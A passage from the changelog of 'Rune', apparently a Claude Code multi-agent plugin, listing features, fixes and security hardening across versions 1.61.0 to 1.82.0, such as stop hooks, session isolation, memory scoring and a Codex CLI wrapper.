  - 4 input methods: label-driven (`--label`), file-based queue, inline args, resume (`--resume`)
  - Paging loop (`--all`) with label-driven cursor and MAX_PAGES=50 safety cap — re-run = resume (label-based exclusion)
  - 4 Rune status labels: `rune:in-progress`, `rune:done`, `rune:failed`, `rune:needs-review`
  - Plan quality gate: skip issues with body < 50 chars (human escalation via GitHub comment + `rune:needs-review` label)
  - Title sanitization: blocklist approach preserving Unicode (not ASCII-only regex)
  - `extractAcceptanceCriteria` with defense-in-depth sanitization
  - Progress file schema v2 with `pr_created` field for crash-resume dedup
  - Session isolation: `config_dir` + `owner_pid` in state file
  - Stop hook loop driver via `arc-issues-stop-hook.sh` — GH API calls deferred to next arc turn (CC-2/BACK-008), uses `--body-file` for all comment posting (SEC-001), `Fixes #N` injection
- **Shared stop hook library** — `scripts/lib/stop-hook-common.sh` extracts common guard functions from arc-batch and arc-hierarchy stop hooks (`parse_input`, `resolve_cwd`, `check_state_file`, `reject_symlink`, `parse_frontmatter`, `get_field`, `validate_session_ownership`, `validate_paths`). Both `arc-batch-stop-hook.sh` and `arc-hierarchy-stop-hook.sh` refactored to source the library.
- **Pre-flight validation script** — `scripts/arc-issues-preflight.sh` validates gh CLI version (>= 2.4.0), authentication, issue number format, issue existence/open state, and Rune status labels with 5s per-gh-call timeout
- **`/rune:cancel-arc-issues`** — Cancel active arc-issues batch loop and remove state file
- New algorithm reference: `skills/arc-issues/references/arc-issues-algorithm.md`

### Changed
- `on-session-stop.sh`: Guard 5c added — defers to `arc-issues-stop-hook.sh` when arc-issues loop is active and owned by current session
- `pre-compact-checkpoint.sh`: Captures `arc_issues_state` alongside `arc_batch_state` before compaction
- `session-compact-recovery.sh`: Re-injects arc-issues loop context after compaction (iteration/total_plans)
- `skills/using-rune/SKILL.md`: Added arc-issues routing row and Quick Reference table entry
- `commands/rest.md`: Added `tmp/gh-issues/` and `tmp/gh-plans/` to cleanup table with active-loop guard

## [1.82.0] - 2026-02-23

### Added
- **5-Factor Composite Scoring** — Echo search now uses BM25 relevance, recency decay, importance weighting, access frequency, and file proximity for context-aware ranking
- **Access Frequency Tracking** — New `echo_access_log` SQLite table and `echo_record_access` MCP tool for usage-based scoring signals
- **File Proximity Scoring** — Evidence path extraction from echo content for workspace-relative proximity weighting
- **Dual-Mode Scoring Validation** — Kendall tau distance comparison between legacy BM25 and composite scoring with configurable toggle via `ECHO_SCORING_MODE` env var
- **Notes Tier** — User-explicit memories (`/rune:echoes remember`) with weight=0.9, stored in `.claude/echoes/notes/`
- **Observations Tier** — Agent-observed patterns with weight=0.5, auto-promotion to Inscribed after 3 access hits via atomic `os.replace()` file rewrite
- **Extended Indexer** — `header_re` now matches Notes and Observations tiers (5 total). EDGE-018 stateful parser prevents content H2 headers from splitting entries
- New test suites: `test_echo_scoring.py`, `test_echo_access.py`, `test_echo_proximity.py`, `test_echo_tiers.py` (33+ tests each)

### Changed
- Echo search server version bumped to 1.54.0
- MCP tools expanded from 4 to 5 (added `echo_record_access`)
- SKILL.md updated to 5-tier lifecycle: Etched / Notes / Inscribed / Observations / Traced
- Scoring weights configurable via environment variables (`ECHO_WEIGHT_BM25`, `ECHO_WEIGHT_RECENCY`, etc.)
- `talisman.example.yml` includes commented-out scoring configuration section

## [1.81.0] - 2026-02-23

### Added
- **Codex Exec Helper Script** (`scripts/codex-exec.sh`) — canonical Codex CLI wrapper enforcing SEC-009 (stdin pipe), model allowlist, timeout clamping [30, 900], .codexignore pre-flight, symlink/path-traversal rejection, 1MB prompt cap, and structured error classification
- New "Script Wrapper" section in `codex-cli/SKILL.md` documenting `codex-exec.sh` as the canonical invocation method
- New "Wrapper Invocation (v1.81.0+)" section in `codex-execution.md` as the preferred pattern

### Security
- **SEC-009**: Eliminated 6 `$(cat ...)` shell expansion vulnerabilities across devise (research-phase, solution-arena, plan-review), rune-echoes, elicitation, and forge-enrichment-protocol
- All Codex invocations now use stdin pipe via wrapper script instead of raw shell expansion
- Model parameter injection prevented by `CODEX_MODEL_ALLOWLIST` regex enforcement in wrapper

### Changed
- Arc Phase 2.8 (semantic verification) and Phase 5.6 (gap analysis) now use `codex-exec.sh` wrapper
- Removed inline `.codexignore` checks from arc-codex-phases.md (handled by wrapper, exit code 2 = skip)
- Simplified model/reasoning/timeout validation in arc phases (delegated to wrapper script)

## [1.80.0] - 2026-02-23

### Added
- **Stagnation Sentinel** — Cross-phase progress tracking with error repetition detection, file-change velocity metrics, and budget consumption forecasting (checkpoint schema v15)
- **Pre-Ship Completion Validator** — New Phase 8.5 dual-gate quality check before PR creation (artifact integrity + quality signals)
- **Specification-by-Example Agent Prompts** — BDD-style Given/When/Then scenarios for mend-fixer (4 scenarios), rune-smith (3 scenarios), and trial-forger (3 scenarios)
- New reference: `stagnation-sentinel.md` for cross-phase stagnation detection
- New reference: `arc-phase-pre-ship-validator.md` for pre-ship quality gate

### Changed
- Arc pipeline expanded from 17 to 18 phases (added Phase 8.5: Pre-Ship Validation)
- Checkpoint schema bumped from v14 to v15 (added `stagnation` field)

## [1.79.0] - 2026-02-23

### Added
- **Hierarchical Plans** — Parent/child plan decomposition with dependency DAGs
  - New `/rune:arc-hierarchy` skill for orchestrating multi-plan execution in dependency order
  - Devise Phase 2.5 "Hierarchical" option for plan decomposition (complexity >= 0.65)
  - Cross-child coherence check (Phase 2.5D) — task coverage, contract dedup, circular dependency detection
  - Requires/provides contract system — supports artifact types: file, export, type, endpoint, migration
  - Pre-execution prerequisite verification with 3 resolution strategies: pause / self-heal / backtrack
  - Feature branch + child sub-branch strategy (`feature/{id}/child-N-{slug}`) with single PR to main
  - Strive child context injection — completed sibling artifacts, prerequisites, self-heal task prioritization
  - Dedicated stop hook (`arc-hierarchy-stop-hook.sh`) separate from arc-batch
  - `/rune:cancel-arc-hierarchy` command for graceful loop cancellation
  - Talisman `work.hierarchy.*` configuration (11 new keys: enabled, max_children, max_backtracks, missing_prerequisite, conflict_resolution, integration_failure, sync_main_before_pr, cleanup_child_branches, require_all_children, test_timeout_ms, merge_strategy)
  - Coherence check output: `tmp/plans/{timestamp}/coherence-check.md`
  - Migration note: hierarchical is fully opt-in — existing strive/arc workflows are unaffected

### Architecture
- Arc checkpoint schema v14: `parent_plan` metadata for hierarchical execution tracking
- Hierarchy-specific stop hook with STOP-001 one-shot guard pattern
- Session isolation for hierarchy state files (config_dir + owner_pid fields)
- Auto-generate requires/provides from task analysis (file references, exports, API routes, imports)
- DAG validation via topological sort to detect cycles before generation completes
- synthesize.md: hierarchical frontmatter templates, parent execution table template, dependency contract matrix template, artifact type reference, status value reference

## [1.78.0] - 2026-02-23

### Added
- **Context Monitor Hook** — PostToolUse hook that injects agent-visible warnings when context usage exceeds thresholds (WARNING at 35% remaining, CRITICAL at 25%)
- **Statusline Bridge** — Statusline script that writes context metrics to bridge file for monitor consumption. Color-coded progress bar, git branch, workflow detection
- **Session Budget in Plans** — Optional `session_budget` frontmatter for strive/arc worker cap validation (`max_concurrent_agents` only in v1.78.0)
- **Talisman config** — New `context_monitor` section with configurable thresholds, debounce, staleness, and per-workflow enable/disable
- **Bridge file cleanup** — Automatic cleanup of context bridge files on session end via ownership-scan pattern in `on-session-stop.sh`

### Architecture
- Producer/Consumer pattern: statusline writes, monitor reads (via `/tmp/` bridge file)
- Inspired by GSD's context monitoring approach
- Non-blocking: all errors exit 0, monitor never blocks tool execution
- Session-isolated: bridge files keyed by `session_id` with `config_dir` + `owner_pid`

## [1.77.0] - 2026-02-23

### Added
- **Mend-Fixer Bidirectional Review Protocol**: Added "Receiving Review Findings — Bidirectional Protocol" section to `mend-fixer.md`. Includes "Actions > Words" principle (no performative agreement), 5-step Technical Pushback Protocol, "Never Blindly Fix" section with 4 anti-patterns, and Commitment section. Extends existing FALSE_POSITIVE handling without modifying existing content.
  - Enhanced: `agents/utility/mend-fixer.md` — new section before RE-ANCHOR
- **Condition-Based Waiting Patterns**: Created `skills/polling-guard/references/condition-based-waiting.md` reference file with 4 pattern categories: Wait-Until (with timeout fallback), Exponential Backoff (with jitter formula), Deadlock Detection (4 scenarios + recovery checklist), and Polling vs Push comparison table. Linked from polling-guard SKILL.md.
  - New: `skills/polling-guard/references/condition-based-waiting.md`
  - Enhanced: `skills/polling-guard/SKILL.md` — added "Additional Patterns" section before Reference
- **Creation Log Template and Seed Logs**: Added `references/creation-log-template.md` with 5 required sections (Problem, Alternatives, Decisions, Rationalizations, History). Created 3 seed CREATION-LOG.md files for inner-flame, roundtable-circle, and context-weaving skills — each with 2+ alternatives, 2+ key decisions, and iteration history from CHANGELOG.md.
  - New: `references/creation-log-template.md` — template for per-skill creation logs
  - New: `skills/inner-flame/CREATION-LOG.md` — 3-layer design decisions, fresh evidence gate history
  - New: `skills/roundtable-circle/CREATION-LOG.md` — 7-phase lifecycle, inscription contracts, multi-wave history
  - New: `skills/context-weaving/CREATION-LOG.md` — unified overflow model, glyph budget system
  - Enhanced: `CLAUDE.md` — added creation-log-template link in Skill Compliance section

## [1.76.0] - 2026-02-23

### Added
- Systematic Debugging skill — 4-phase methodology (Observe → Narrow → Hypothesize → Fix) with Iron Law DBG-001
- Persuasion Principles reference guide — principle mapping for 5 agent categories
- CSO (Claude Search Optimization) reference guide — trigger-focused description writing
- Commitment Protocol sections added to work agents (rune-smith, trial-forger)
- Authority & Evidence sections added to review agents (ward-sentinel, ember-oracle, flaw-hunter, void-analyzer)
- Authority & Unity section added to mend-fixer agent
- Consistency section added to pattern-seer agent

### Changed
- 7 skill descriptions CSO-optimized for better auto-discovery
- Failure Escalation Protocol added to rune-smith agent

## [1.75.0] - 2026-02-23

### Added
- **Skill Testing Framework** (`skill-testing` skill): TDD methodology for documentation — write a failing pressure scenario first, then write the skill to address it. Includes Iron Law (SKT-001: "NO SKILL WITHOUT A FAILING TEST FIRST"), RED/GREEN/REFACTOR cycle for skills, rationalization table template, pressure scenarios for roundtable-circle/rune-smith/mend-fixer, and meta-testing checklist. Set `disable-model-invocation: true` to avoid CSO collision with `testing` skill.
  - New: `skills/skill-testing/SKILL.md` — main skill with TDD cycle and priority targets
  - New: `skills/skill-testing/references/pressure-scenarios.md` — 9 detailed scenario scripts (3 per target skill)
  - New: `skills/skill-testing/references/rationalization-tables.md` — observed patterns by agent type and severity

### Enhanced
- **Inner Flame fresh evidence verification**: Added item #6 to Layer 1 (Grounding Check) requiring fresh evidence for every completion claim. Agents must now cite specific command output, test results, or file:line references from the current session — not just claim "tests pass." Replaces the originally proposed keyword-banning approach with a self-check question that avoids false positives. Preserves the existing 3-layer model (zero changes to agent prompts, hooks, or CLAUDE.md).
  - Enhanced: `skills/inner-flame/SKILL.md` — fresh evidence item #6 in Layer 1, updated Seal Enhancement descriptions
  - Enhanced: `skills/inner-flame/references/role-checklists.md` — per-role evidence items for Worker (3 items), Fixer (3 items), and Reviewer (1 item)

## [1.74.1] - 2026-02-23

### Fixed
- **ZSH eval history expansion inside `[[ ]]`**: Fixed `(eval):1: parse error: condition expected: \!` errors in arc-batch team cleanup. In zsh eval context, `!` inside `[[ ]]` (e.g., `[[ ! -L path ]]`, `[[ "$a" != "$b" ]]`) triggers history expansion before the conditional parser processes it.
  - Restructured `arc-batch-stop-hook.sh` ARC_PROMPT template to avoid `!` entirely: `[[ ! -L ]]` → `[[ -L ]] && continue`, `!= ` → `case ... esac`
  - Fixed same pattern in `post-arc.md` and `arc-phase-cleanup.md` pseudocode: `[[ ! -L ]] &&` → `{ [[ -L ]] || action; }`
  - Fixed `commands/rest.md` signal cleanup: restructured `[[ ! -L ]]` conditional
  - Added **Check D** to `enforce-zsh-compat.sh`: detects `!` inside `[[ ]]` and auto-fixes with `setopt no_banghist;`
  - Refactored hook auto-fixes to be **cumulative** — Checks B, C, D can all apply to the same command (previously each check exited early, so only the first fix was applied)
  - Added **Pitfall 7** documentation to `zsh-compat` skill: `!` inside `[[ ]]` in eval context
  - Updated quick reference table with `!`-free patterns for eval-safe conditionals

## [1.74.0] - 2026-02-23

### Changed
- **Refactor Phase 5.6 (Codex Gap Analysis) to inline Bash pattern**: Removed team lifecycle overhead (~20-30s savings per arc run) by switching from spawning `arc-gap-{id}` team with teammates to orchestrator-direct `Bash("codex exec")` calls, matching the proven Phase 2.8 pattern.
  - Rewritten: `arc-codex-phases.md` Phase 5.6 section (primary implementation)
  - Rewritten: `gap-analysis.md` STEP 4+5 (secondary implementation)
  - Removed: `codex_gap_analysis` entry from `PHASE_PREFIX_MAP` in `arc-phase-cleanup.md`
  - Removed: `"arc-gap-"` prefix from `ARC_TEAM_PREFIXES` in `arc-preflight.md`
  - Added: Phase 5.6 entries to `phase-tool-matrix.md` (tool restrictions + time budget)
  - Updated: SKILL.md Phase 5.6 stub and timeout comment
  - Fixed: ZSH-FIX in `arc-phase-cleanup.md` `postPhaseCleanup` — symlink guard changed from `[[ ! -L ]] && rm` to `[[ -L ]] || rm` to avoid `!` history expansion in zsh eval context

## [1.73.0] - 2026-02-23

### Added
- **Arc-scoped file-todos with per-source subdirectories**: Todos organized into `work/`, `review/`, `audit/` subdirectories instead of flat `todos/` directory. Independent ID sequences per subdirectory.
  - New: `resolveTodosBase()` and `resolveTodosDir()` pseudo-functions in integration-guide.md
  - New: `--todos-dir` flag for strive, appraise, audit, and mend (arc passes `tmp/arc/{id}/todos/`)
  - New: Arc todos scaffolding creates `work/` and `review/` subdirectories before Phase 5
  - New: Post-phase verification (Phase 5, 6, 7) with spot-check and `todos_summary` in checkpoint
  - New: File-Todos Summary section in ship phase PR body
  - Enhanced: Mend cross-source scan via `Glob(\`${base}*/[0-9][0-9][0-9]-*.md\`)` for finding_id matching
  - Enhanced: file-todos subcommands updated for per-source subdirectory awareness
  - New: `file_todos` section in talisman.yml (enabled: true, auto_generate: work/review/audit)

## [1.72.0] - 2026-02-23

### Added
- **Arc-batch inter-iteration summaries**: Structured summary files written between arc iterations for improved compact recovery and context awareness. Hybrid approach: hook-written structured metadata + Claude-written context note.
  - New: `tmp/arc-batch/summaries/iteration-{N}.md` per-iteration summary files with plan path, status, git log, PR URL, branch name
  - New: ARC_PROMPT step 4.5 for Claude context note injection (conditional on summary existence, Truthbinding-wrapped)
  - New: `summary_enabled` and `summary_dir` fields in arc-batch state file (backward-compatible defaults)
  - Enhanced: Pre-compact checkpoint captures arc-batch iteration state (`arc_batch_state` field)
  - Enhanced: Compact recovery references latest summary file in additionalContext
  - New talisman config: `arc.batch.summaries.enabled` (default: true)
- Summary writer follows Revised Flow ordering: summary written BEFORE plan completion mark for crash-safety
- Trace logging (`_trace()`) instrumentation in arc-batch stop hook (opt-in via `RUNE_TRACE=1`)

## [1.71.0] - 2026-02-23

### Added
- **Universal Goldmask integration** across all Rune workflows that previously lacked it:
  - **Forge**: Phase 1.3 (file ref extraction) + Phase 1.5 (Lore Layer) with risk-boosted Forge Gaze scoring (CRITICAL +0.15, HIGH +0.08) and risk context injection into forge agent prompts. New `--no-lore` flag.
  - **Mend**: Phase 0.5 (Goldmask data discovery) with risk-overlaid severity ordering, fixer prompt injection (risk tiers + wisdom advisories + blast-radius warnings), and Phase 5.9 (deterministic quick check against MUST-CHANGE files).
  - **Inspect**: Phase 0.3 (Lore Layer) with risk-weighted requirement classification, dual inspector assignment for CRITICAL requirements, risk-enriched inspector prompts with role-specific notes, and Historical Risk Assessment in VERDICT.md.
  - **Devise upgrade**: Phase 2.3 upgraded from 2-agent basic to 6-agent enhanced mode (default). Three depth modes: `basic` (2 agents), `enhanced` (6 agents: lore + 3 Impact tracers + wisdom + coordinator), `full` (8 agents, inlined). Partial-ready gate, 5-min hard ceiling.
- **Shared Goldmask infrastructure**:
  - `goldmask/references/data-discovery.md` — standardized protocol for finding and reusing existing Goldmask outputs across workflows (7-path search order including forge/ and plans/, age guard, TOCTOU-safe reads, 30% overlap validation, POSIX-only platform note)
  - `goldmask/references/risk-context-template.md` — shared template for injecting risk data into agent prompts (3 sections: File Risk Tiers, Caution Zones, Blast Radius)
- **Per-workflow talisman config** (`goldmask.forge`, `goldmask.mend`, `goldmask.devise`, `goldmask.inspect`) with documented kill switches and defaults

### Changed
- `goldmask.enabled` now defaults to `true` consistently across all workflows
- `goldmask.devise.depth` defaults to `enhanced` (was implicit `basic`)
- `agent-registry.md`: lore-analyst usage contexts updated (now includes forge, inspect)

## [1.70.0] - 2026-02-23

### Added
- Phase 5.5 STEP A.10: Stale reference detection — scans for lingering references to deleted files
- Phase 5.5 STEP A.11: Flag scope creep detection — identifies unplanned CLI flags in implementation
- Phase 5.8 dual-gate: Codex findings now trigger gap remediation via OR logic with deterministic gate
- New talisman key: `codex.gap_analysis.remediation_threshold` (default: 5, range: [1, 20])

### Unchanged
- `halt_on_critical` default remains `false` — Codex dual-gate provides activation path without breaking existing pipelines

## [1.69.0] - 2026-02-23

### Added
- **file-todos skill** — Unified file-based todo tracking system for Rune workflows. Structured YAML frontmatter, 6-state lifecycle (`pending/ready/in_progress/complete/blocked/wont_fix`), source-aware templates, and 7 subcommands (`create`, `triage`, `status`, `list`, `next`, `search`, `archive`).
  - **Core skill**: `skills/file-todos/SKILL.md` with 5 reference files (todo-template, lifecycle, triage-protocol, integration-guide, subcommands).
  - **Command entry**: `commands/file-todos.md` for `/rune:file-todos` invocation.
  - **Review integration**: Phase 5.4 in `orchestration-phases.md` — auto-generates file-todos from TOME findings (gated by `talisman.file_todos.enabled`).
  - **Work integration**: `todo-protocol.md` in strive — per-task todo tracking during swarm execution.
  - **Mend integration**: Phase 5.9 in `mend/SKILL.md` — updates file-todos for resolved findings (gated by `talisman.file_todos.enabled`).
  - **Agent awareness**: `rune-smith.md` and `trial-forger.md` updated with todo protocol reference.
  - **Inscription schema**: `inscription-schema.md` updated with `todos` output field.

## [1.68.0] - 2026-02-23

### Added
- **Guaranteed post-phase team cleanup** (`postPhaseCleanup`) — New trailing-edge cleanup function that runs after every delegated arc phase completes (success/fail/timeout). Forms a before+after bracket with `prePhaseCleanup` around every phase:
  - **`arc-phase-cleanup.md`** (new): Contains `postPhaseCleanup()` function and `PHASE_PREFIX_MAP` mapping 10 delegated phases to their team name prefixes. Uses prefix-based filesystem scan as primary mechanism (handles null `team_name` in checkpoint). Includes cross-session safety via `.session` marker comparison and symlink guards.
  - **SKILL.md phase stubs**: All 10 delegated phases now call `postPhaseCleanup(checkpoint, phaseName)` after checkpoint update.
  - **ARC-9 Strategy D** (new): Prefix-based sweep in post-arc final sweep catches teams missed by checkpoint. Uses `ARC_TEAM_PREFIXES` for comprehensive orphan scanning with symlink guard and regex validation.
- **Goldmask session hook integration** — Closes the goldmask prefix gap in session cleanup hooks:
  - **`on-session-stop.sh`**: Added `goldmask-*` to team directory scan pattern (was previously excluded).
  - **`session-team-hygiene.sh`**: Added `goldmask-*` to orphan team scan and `.rune-goldmask-*.json` to state file pattern.
  - **`goldmask/SKILL.md`**: Added state file creation (`tmp/.rune-goldmask-{session_id}.json`) with proper session isolation fields and cleanup on workflow completion.

### Changed
- **`post-arc.md`**: ARC-9 Final Sweep now has 4 strategies (A: discovery+shutdown, B: SDK TeamDelete, C: filesystem fallback, D: prefix-based sweep).
- **`arc-phase-goldmask-verification.md`**: Added `postPhaseCleanup` call after checkpoint update and updated crash recovery documentation.
- **Phase reference files**: Updated cleanup documentation in `arc-phase-forge.md`, `arc-phase-code-review.md`, `arc-phase-work.md`, `arc-phase-mend.md`, `arc-phase-test.md`, `arc-phase-plan-review.md` to reference both pre and post phase cleanup.
- **`team-lifecycle-guard.md`** (rune-orchestration): Updated Inter-Phase Cleanup section to document the before+after bracket pattern.

## [1.67.0] - 2026-02-22

### Added
- **Session-scoped team cleanup** — Prevents cross-session interference when multiple Claude Code sessions work on the same repo:
  - **TLC-004 session marker hook** (`stamp-team-session.sh`): PostToolUse:TeamCreate hook writes `.session` file inside team directory containing `session_id`. Atomic write (tmp+mv), fail-open.
  - **Session-scoped stale scan** (`enforce-team-lifecycle.sh`): TLC-001 now checks `.session` marker during stale detection — skips teams owned by other live sessions, cleans only orphaned teams.
  - **Session-scoped appraise identifiers**: `/rune:appraise` team names now include 4-char session suffix (`rune-review-{hash}-{sid4}`) to prevent collision when two sessions review the same commit.
  - **Session context in TLC-002 reports**: `verify-team-cleanup.sh` includes 8-char session ID prefix in post-delete diagnostic messages.
  - **Session-scoped arc-batch cleanup**: `arc-batch-stop-hook.sh` filters team cleanup to session-owned teams only (R13 fix).
- **Session Ownership documentation** in `team-lifecycle-guard.md`: `.session` marker contract, ownership verification matrix, state file session fields reference.

## [1.66.0] - 2026-02-22

### Added
- **Shard-aware arc execution** — `/rune:arc` and `/rune:arc-batch` now detect shattered plans and coordinate shard execution:
  - **Shard detection in arc pre-flight**: Detects shard plans via `-shard-N-` filename regex, reads parent plan frontmatter, verifies prerequisite shards are complete (warn, not block)
  - **Shared feature branch**: Shard arcs reuse `rune/arc-{feature}-shards-{timestamp}` branch instead of creating separate branches per shard
  - **Shard-aware PR titles**: `feat(shard 2 of 4): methodology - feature name` format with `safePrTitle` sanitizer compatibility
  - **Shard context in PR body**: Parent plan reference, dependency list, and shard position
  - **Arc-batch shard group detection**: Auto-sorts shards by number, auto-excludes parent plans (`shattered: true`), detects missing shard gaps
  - **Arc-batch preflight shard validation**: Validates shard frontmatter (`shard:`, `parent:` fields), checks group ordering and gaps
  - **Shard-aware stop hook**: Detects sibling shard transitions — stays on feature branch instead of checking out main between sibling shards
  - **Shard metadata in batch progress**: `batch-progress.json` schema v2 with `shard_group`, `shard_num`, and group summary
  - **Talisman configuration**: `arc.sharding.*` keys (enabled, auto_sort, exclude_parent, prerequisite_check, shared_branch) — all default to true
  - **`--no-shard-sort` flag** for arc-batch to disable auto-sorting
- **Parent path fallback**: Sibling-relative path resolution when absolute `parent:` path in shard frontmatter fails (handles `plans/shattering/` subdirectory case)
- **Checkpoint schema v12**: Added optional `shard` field with num, total, name, feature, parent, dependencies

## [1.65.1] - 2026-02-22

### Changed
- **Agent quality enhancements** — ai-devkit design philosophy learnings applied to 10 agent files:
  - `simplicity-warden`: Added Readability Assessment (4-gate Reading Test), 7 Simplification Patterns taxonomy, Hard Rule
  - `flaw-hunter`: Added Hypothesis Protocol with evidence-first analysis, UNCERTAIN severity cap, Hard Rule
  - `mimic-detector`: Added Duplication Tolerance Threshold with concrete flag/no-flag criteria, security override, Hard Rule
  - `mend-fixer`: Added QUAL-Prefix Fix Guidance table (7 simplification patterns for QUAL findings)
  - `scroll-reviewer`: Added 5-dimension Quality Dimensions rating (1-5), severity classification, critical dimension override, Hard Rule
  - `truth-seeker`, `naming-intent-analyzer`, `ember-oracle`, `depth-seer`, `tide-watcher`: Added Hard Rule sections

## [1.65.0] - 2026-02-22

### Changed
- **Skill rename to avoid autocomplete collision** — Renamed 3 skills to prevent `/plan`, `/review`, `/work` from colliding with Claude Code built-in commands in autocomplete:
  - `/rune:plan` -> `/rune:devise`
  - `/rune:review` -> `/rune:appraise`
  - `/rune:work` -> `/rune:strive`
- Skill directories renamed: `skills/plan/` -> `skills/devise/`, `skills/review/` -> `skills/appraise/`, `skills/work/` -> `skills/strive/`
- All cross-references updated across 77 files (289 insertions, 289 deletions)
- **Preserved (unchanged)**: Internal team name prefixes (`rune-review-*`, `rune-work-*`, `rune-plan-*`), state file patterns, `ARC_TEAM_PREFIXES`, talisman config keys, workflow IDs, output paths (`tmp/reviews/`, `tmp/work/`), agent directories (`agents/work/`, `agents/review/`), cancel commands (`/rune:cancel-review`)

## [1.64.0] - 2026-02-22

### Changed
- **Commands-to-Skills migration** — Migrated 7 major commands to skills format with lazy-load reference decomposition: `strive`, `devise`, `appraise`, `audit`, `mend`, `inspect`, `forge`
- Skills gain `allowed-tools`, `disable-model-invocation`, `argument-hint`, and lazy-load reference support vs legacy commands
- Plugin now has **8 commands** and **25 skills** (was 15 commands, 18 skills)
- 12 new reference files created with content extracted from commands (quality-gates.md, todo-protocol.md, brainstorm-phase.md, ash-summoning.md, tome-aggregation.md, review-scope.md, fixer-spawning.md, resolution-report.md, inspector-prompts.md, verdict-synthesis.md, deep-mode.md, forge-enrichment-protocol.md)
- 9 existing reference files moved via `git mv` (history preserved): 4 work refs, 4 plan refs, 1 mend ref
- Cross-references updated: `skills/git-worktree/SKILL.md`, `skills/elicitation/references/phase-mapping.md`, `skills/roundtable-circle/references/risk-tiers.md`, `skills/roundtable-circle/references/chunk-orchestrator.md`, `skills/roundtable-circle/references/plan-parser.md`

## [1.63.2] - 2026-02-22

### Fixed
- **SEC-1/SEC-2**: Added checkpoint validation guards in `arc-codex-phases.md` Phase 5.6 — `plan_file` path validation and `git_sha` pattern validation prevent prompt injection from tampered checkpoint JSON
- **VEIL-1**: Added missing Phase 8.5 (AUDIT MEND) and Phase 8.7 (AUDIT VERIFY) to completion report template in `post-arc.md` (pre-existing bug)
- **DOC-1**: Fixed broken `team-lifecycle-guard.md` relative links in `arc-phase-mend.md` — updated to correct `../../rune-orchestration/references/` path
- **SEC-3**: Added inline SEC annotation for `enrichedPlanPath` in `arc-codex-phases.md` Phase 2.8
- **VEIL-2**: Clarified SETUP_BUDGET scope comment in `arc/SKILL.md` — was misleadingly described as "mend-scoped" but applies to all delegated phases
- **QUAL-1**: Added missing Inputs/Outputs/Error handling metadata to `codex-execution.md` for cross-skill consistency
- **DOC-2**: Replaced hardcoded `/18 phases` with `/${PHASE_ORDER.length}` in `post-arc.md` echo persist
- **Context Intelligence**: Removed invalid `linkedIssues` field from `gh pr view --json` query — field doesn't exist in gh CLI structured output

## [1.63.1] - 2026-02-21

### Fixed
- **Arc checkpoint zsh compat** — Replaced `! [[ "$epoch" =~ ^[0-9]+$ ]]` with POSIX `case` statement in concurrent arc detection. The negated `[[ =~ ]]` caused `condition expected: \!` errors in zsh (macOS default shell)

## [1.63.0] - 2026-02-21

### Added
- **Session-level isolation for all Rune workflows** — Two-layer session identity (`config_dir` + `owner_pid`) prevents cross-session interference when multiple Claude Code sessions work on the same repository
- **`resolve-session-identity.sh`** — Shared helper script that exports `RUNE_CURRENT_CFG` (resolved config dir) and uses `$PPID` for process-level isolation. Sourced by all hook scripts that need ownership filtering
- **Ownership filtering in hook scripts** — `enforce-teams.sh`, `on-session-stop.sh`, `enforce-polling.sh`, and `session-team-hygiene.sh` now filter state files by session ownership before acting
- **Session identity fields in all state files** — `config_dir`, `owner_pid`, `session_id` added to state file writes in review, audit, work, mend, forge, and inspect commands
- **Session identity in arc checkpoints** — `config_dir`, `owner_pid`, `session_id` added to `.claude/arc/{id}/checkpoint.json` creation
- **Foreign session warning in cancel commands** — `cancel-review.md`, `cancel-audit.md`, and `cancel-arc-batch.md` warn (don't block) when cancelling another session's workflow. `cancel-arc.md` skips batch cancellation when the batch belongs to another live session
- **Core Rule 11: Session isolation** — Documented as CRITICAL rule in plugin CLAUDE.md and project CLAUDE.md

### Fixed
- **Arc pre-flight directory** — Fixed pre-flight check using bare relative `find .claude/arc` instead of explicit `${CWD}/.claude/arc` (correct — project-scoped checkpoints) in both jq and grep fallback paths
- **Arc resume path** — Fixed `--resume` checkpoint discovery to search `${CWD}/.claude/arc` instead of `$CHOME/arc`
- **Cancel command PID validation** — Added numeric validation (`/^\d+$/.test()`) before `kill -0` calls in cancel-review.md and cancel-audit.md pseudocode (SEC-3)
- **Cancel command variable scoping** — Fixed `const selected` redeclaration and `state.owner_pid` reference in cancel-review.md and cancel-audit.md (BACK-2, BACK-3)
- **enforce-polling.sh missing inspect glob** — Added `.rune-inspect-*.json` to state file detection glob, matching enforce-teams.sh coverage (QUAL-7)
- **on-session-stop.sh config-dir resolution** — Moved `resolve-session-identity.sh` source before GUARD 5 to eliminate duplicate config-dir resolution (SEC-12)

### Changed
- `enforce-teams.sh`: Sources `resolve-session-identity.sh`, filters arc checkpoints and state files by ownership
- `on-session-stop.sh`: Sources `resolve-session-identity.sh`, filters all 3 cleanup phases (teams, states, arcs) by ownership
- `enforce-polling.sh`: Sources `resolve-session-identity.sh`, filters workflow detection by ownership
- `session-team-hygiene.sh`: Sources `resolve-session-identity.sh`, filters stale state file counting by ownership

## [1.62.0] - 2026-02-21

### Added
- **Git worktree isolation for `/rune:strive`** — Experimental `--worktree` flag enables isolated git worktree execution. Workers operate in separate worktrees with direct commits instead of patch generation
- **`git-worktree` skill** (`skills/git-worktree/SKILL.md`) — Background knowledge for worktree merge strategies, conflict resolution, and cleanup procedures
- **Wave-based execution** — Tasks grouped by dependency depth into waves for parallel worktree execution. DFS-based wave computation with cycle detection
- **Merge broker** — Replaces commit broker in worktree mode. Merges worker branches into feature branch between waves with `--no-ff`, conflict escalation to user (never auto-resolves)
- **`worktree-merge.md` reference** — Complete merge broker algorithm, `collectWaveBranches()`, `cleanupWorktree()`, and conflict resolution flow
- **Wave-aware monitoring** — Per-wave monitoring loop with independent timeouts, merge broker dispatch between waves
- **SDK canary test** — Validates `isolation: "worktree"` parameter is supported before enabling worktree mode. Graceful fallback to patch mode on failure
- **Worktree garbage collection** — Phase 6 cleanup prunes orphaned worktrees and branches matching `rune-work-*` pattern
- **Worktree worker prompts** — Updated `worker-prompts.md`, `rune-smith.md`, and `trial-forger.md` with worktree-specific commit protocol and branch metadata reporting

### Changed
- work.md Phase 0: Added `--worktree` flag parsing with talisman fallback (`work.worktree.enabled`)
- work.md Phase 0.5: Added worktree validation (git version check, worktree command availability, SDK canary)
- work.md Phase 1: Added wave computation (step 5.3) after dependency linking
- work.md Phase 2: Added wave-based worker spawning with `isolation: "worktree"` as separate code path
- work.md Phase 3: Added wave-aware monitoring loop for sequential wave execution
- work.md Phase 3.5: Added merge broker as worktree-mode alternative to commit broker
- work.md Phase 6: Added worktree garbage collection (step 3.6)
- Skill count: 17 → 18 (added git-worktree)

## [1.61.0] - 2026-02-21

### Added
